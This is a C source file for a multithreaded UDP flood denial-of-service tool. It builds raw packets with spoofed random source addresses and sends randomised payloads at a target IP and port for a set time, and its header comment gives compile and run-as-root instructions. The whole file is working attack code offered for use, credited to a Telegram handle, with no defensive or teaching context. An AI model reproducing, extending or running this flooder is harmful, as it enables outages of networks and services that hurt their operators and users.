/*
Its compiled with: gcc [filename] -pthread -o [binaryfilename]
(you might need to add special args such as c98 to the above compile line if it shows errors)
and run as root with ./[binaryfilename]
example: ./udprape <target IP> <port> <packet_size> <number threads to use (CPU cores)> <pps limiter, -1 for no limit> <time in seconds>
*/

#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0xaaf219b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

//v5
int packet_size;

void print_ip(int ip)
{
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    printf("%d.%d.%d.%d\n", bytes[3], bytes[2], bytes[1], bytes[0]);
}

void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) { Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned short csum (unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 128;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
}

void setup_udp_header(struct udphdr *udph)
{
    udph->source = htons(50000 + rand_cmwc() % 65535);
    udph->dest = htons(floodport);
    udph->check = 0;

    // The payload data as provided by the user
    unsigned char payload[] = {
        0x08, 0x1e, 0x77, 0xda
    };

    memcpy((void *)udph + sizeof(struct udphdr), payload, sizeof(payload));
    udph->len = htons(sizeof(struct udphdr) + sizeof(payload));
}

void *flood(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(17015);
    sin.sin_addr.s_addr = inet_addr(td);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_udp_header(udph);

    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);

    int sport[packet_size];
    unsigned char payload1[packet_size];

    for(int i = 0; i <= packet_size; i++){
        sport[i] = htons(randnum(55000,64932));
        payload1[i] = rand_cmwc();
    }

    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "_error_: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;

    int packet_lenght = 0;

    while(1){
        iph->saddr = htonl(rand_cmwc() & 0xFFFFFFFF);
        udph->source = htons(sport[randnum(0, packet_size)]);

        packet_lenght = randnum(500, packet_size);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);

        memcpy((void *)udph + sizeof(struct udphdr), payload1, packet_lenght);
        udph->len = htons(sizeof(struct udphdr) + packet_lenght);

        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + packet_lenght;
        iph->check = csum((unsigned short *)datagram, iph->tot_len);

        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));

        pps++;
        if(i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}

int main(int argc, char *argv[])
{
    if(argc < 5){
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <target IP> <port> <packet_size> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        fprintf(stderr, "Telegram: @SLAVICD OG Tenplate- Bo6 Remake by Toxic\n");
        exit(-1);
    }

    fprintf(stdout, "Setting up Sockets...\n");

    int num_threads = atoi(argv[4]);
    int maxpps = atoi(argv[5]);

    floodport = atoi(argv[2]);
    packet_size = atoi(argv[3]);

    limiter = 0;
    pps = 0;
    pthread_t thread[num_threads];

    int multiplier = 20;

    for(int i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, &flood, (void *)argv[1]);
    }
    fprintf(stdout, "Starting Flood...\n");
    for(int i = 0; i < (atoi(argv[6])*multiplier); i++) {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps) {
            if(1 > limiter) {
                sleeptime += 100;
            } else {
                limiter--;
            }
        }
    }
}
